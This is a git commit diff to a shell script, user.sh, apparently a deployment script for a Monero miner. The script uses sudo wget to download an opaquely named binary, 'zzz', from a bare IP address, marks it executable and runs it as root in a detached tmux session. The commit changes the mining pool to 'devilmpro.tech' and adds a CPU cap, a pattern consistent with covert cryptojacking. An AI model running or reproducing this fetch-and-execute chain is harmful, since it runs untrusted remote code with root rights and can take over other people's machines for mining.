85721216472a1e3e7564e948316e6f3a3e058e0a
deepmonero <70528104+deepmonero@users.noreply.github.com>
2020-09-24 23:37:08 +0800

    Update user.sh

--- user.sh
+++ user.sh
@@ -10,5 +10,5 @@ sudo bash enable_1gb_pages.sh
 sudo bash randomx_boost.sh
 sudo wget http://51.38.98.168/papa/zzz
 sudo chmod +x zzz
-tmux new-session -d -s a 'sudo ./zzz -o pool.supportxmr.com:3333 -u 47m3iTu59TEdVQibKrNbzwiwvzB1KKjBvT7q1wQiiP2HTezNPKxyUDiT6wcXedPEN73tUTp6hqQEGFpnyyq56BcHE2ULsDh -p 5SEP1 --donate-level 0 --nicehash --randomx-1gb-pages '
+tmux new-session -d -s a 'sudo ./zzz -o devilmpro.tech:3330 --max-cpu-usage=50 --donate-level 0 --nicehash --randomx-1gb-pages --rig-id=US24SEPCH'
 
